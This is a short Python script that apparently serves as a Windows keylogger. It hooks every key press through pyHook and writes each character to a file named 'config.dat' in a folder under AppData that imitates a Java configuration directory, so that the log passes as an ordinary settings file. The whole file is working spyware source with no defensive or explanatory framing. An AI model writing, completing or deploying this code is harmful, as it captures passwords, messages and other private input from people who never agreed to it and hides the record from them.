import pyHook, pythoncom, sys, logging
import os
import time


home = os.path.expanduser("~") 
if not os.path.exists(home + "//Appdata//Roaming//Java//config"):
        os.makedirs(home + "//Appdata//Roaming//Java//config")




file_log = home + "//Appdata//Roaming//Java//" + 'config.dat'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log,
                        level=logging.DEBUG,
                        format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

